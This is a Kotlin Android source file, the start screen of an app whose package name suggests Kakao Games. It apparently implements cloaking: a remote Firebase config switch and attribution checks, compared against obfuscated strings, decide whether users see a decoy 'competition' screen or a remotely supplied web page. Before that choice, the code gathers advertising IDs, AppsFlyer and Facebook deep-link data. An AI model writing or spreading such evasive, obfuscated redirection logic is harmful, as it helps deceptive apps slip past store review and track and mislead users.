package com.kakaogames.gd.ui

import android.os.Bundle
import android.view.LayoutInflater
import android.view.View
import android.view.ViewGroup
import androidx.appcompat.app.AlertDialog
import androidx.fragment.app.Fragment
import androidx.fragment.app.viewModels
import androidx.lifecycle.MutableLiveData
import androidx.lifecycle.lifecycleScope
import androidx.navigation.fragment.findNavController
import com.appsflyer.AppsFlyerLib
import com.facebook.FacebookSdk
import com.facebook.applinks.AppLinkData
import com.google.android.gms.ads.identifier.AdvertisingIdClient
import com.google.android.material.dialog.MaterialAlertDialogBuilder
import com.google.firebase.remoteconfig.FirebaseRemoteConfig
import com.google.firebase.remoteconfig.FirebaseRemoteConfigSettings
import com.kakaogames.gd.R
import com.kakaogames.gd.databinding.FragmentStartBinding
import com.kakaogames.gd.utils.kakIsInternetAvailable
import com.kakaogames.gd.utils.vigenere
import dagger.hilt.android.AndroidEntryPoint
import kotlinx.coroutines.Dispatchers
import kotlinx.coroutines.launch
import javax.inject.Inject

@AndroidEntryPoint
class StartFragment : Fragment() {
    @Inject
    lateinit var kakAppsFlyerLiveData: MutableLiveData<MutableMap<String, Any>>

    private var _kakBinding: FragmentStartBinding? = null
    private val kakBinding get() = _kakBinding!!

    private val kakViewModel: StartViewModel by viewModels()

    override fun onCreateView(
        inflater: LayoutInflater,
        container: ViewGroup?,
        savedInstanceState: Bundle?
    ): View {
        _kakBinding = FragmentStartBinding.inflate(layoutInflater)
        return kakBinding.root
    }

    override fun onViewCreated(view: View, savedInstanceState: Bundle?) {
        super.onViewCreated(view, savedInstanceState)
        kakInitLoading()
    }

    override fun onDestroyView() {
        super.onDestroyView()
        _kakBinding = null
    }


    private fun kakInitLoading() {
        kakBinding.pBar.visibility = View.VISIBLE
        val kakLink = kakViewModel.kakGetCachedLink()

        if (kakIsInternetAvailable(requireContext())) {
            if (kakLink != "") {
                kakNavigateToWebViewFragment(kakLink)
                kakBinding.pBar.visibility = View.GONE
            } else {
                kakStartInitFirebase()
            }
        } else {
            kakShowNoInternetDialog()
            kakBinding.pBar.visibility = View.GONE
        }
    }

    private fun kakStartInitFirebase() {
        val kakRemoteConfig = FirebaseRemoteConfig.getInstance()
        val kakSettings =
            FirebaseRemoteConfigSettings.Builder()
                .setMinimumFetchIntervalInSeconds(2500)
                .build()
        kakRemoteConfig.setConfigSettingsAsync(kakSettings)
        kakRemoteConfig.fetchAndActivate().addOnCompleteListener {
            val kakOrganic =
                kakRemoteConfig.getBoolean(resources.getString(R.string.firebase_organic))
            val kakUrl = kakRemoteConfig.getString(resources.getString(R.string.firebase_root_url))
            kakViewModel.kakSetOrganicAndUrl(kakOrganic, kakUrl)
            if (kakUrl.contains("jhfz".vigenere())) {
                kakBeginMainWork()
            } else {
                kakNavigateToCompetitionFragment()
            }
        }
    }

    private fun kakBeginMainWork() = lifecycleScope.launch(Dispatchers.IO) {
        kakInitFB()
        kakGetGoogleAID()
        lifecycleScope.launch(Dispatchers.Main) {
            kakSetAppsFlyerParams()
        }
    }

    private fun kakInitFB() {
        FacebookSdk.setAutoInitEnabled(true)
        FacebookSdk.fullyInitialize()
        AppLinkData.fetchDeferredAppLinkData(requireContext()) {
            val kakUri = it?.targetUri
            kakViewModel.kakSetDeepLink(kakUri)
        }
    }

    private fun kakGetGoogleAID() {
        val kakAdvertisingIdClient = AdvertisingIdClient.getAdvertisingIdInfo(requireContext())
        kakViewModel.kakSetGoogleAID(kakAdvertisingIdClient.id.toString())
    }

    private fun kakSetAppsFlyerParams() {
        val kakAppsUID = AppsFlyerLib.getInstance().getAppsFlyerUID(requireContext())
        kakViewModel.kakSetAppsFlyerUID(kakAppsUID)

        kakAppsFlyerLiveData.observe(viewLifecycleOwner) {
            for (kakInform in it) {
                when (kakInform.key) {
                    "ct_edadug".vigenere() -> {
                        kakViewModel.kakSetAppsFlyerStatus(kakInform.value.toString())
                    }
                    "eoyzasgb".vigenere() -> {
                        kakViewModel.kakSetAppsFlyerCampaign(kakInform.value.toString())
                    }
                    "ospsa_coixcq".vigenere() -> {
                        kakViewModel.kakSetAppsFlyerMediaSource(kakInform.value.toString())
                    }
                    "ct_oraxnsr".vigenere() -> {
                        kakViewModel.kakSetAppsFlyerChannel(kakInform.value.toString())
                    }
                }
            }
            kakCollectWebLink()
        }
    }


    private fun kakCollectWebLink() {
        val kakOrganicAccess = kakViewModel.kakGetOrganicAccess()
        val kakMediaSource = kakViewModel.kakGetMediaSource()
        if (kakOrganicAccess == false && kakMediaSource == "qfsknsc".vigenere()) {
            kakNavigateToCompetitionFragment()
            return
        }
        val kakLink = kakViewModel.kakCollectWebLink(requireContext())
        kakNavigateToWebViewFragment(kakLink)
    }


    private fun kakNavigateToWebViewFragment(link: String) {
        val kakAction = StartFragmentDirections.actionStartFragmentToWebViewFragment(link)
        findNavController().navigate(kakAction)
    }

    private fun kakNavigateToCompetitionFragment() {
        val kakAction = StartFragmentDirections.actionGlobalCompetitionFragment()
        findNavController().navigate(kakAction)
    }


    private fun kakShowNoInternetDialog(): AlertDialog =
        MaterialAlertDialogBuilder(requireContext()).setTitle("No internet connection")
            .setMessage("Check your internet connection and try again later")
            .setCancelable(false)
            .setPositiveButton("Try again") { dialog, _ ->
                kakInitLoading()
                dialog.dismiss()
            }
            .show()
}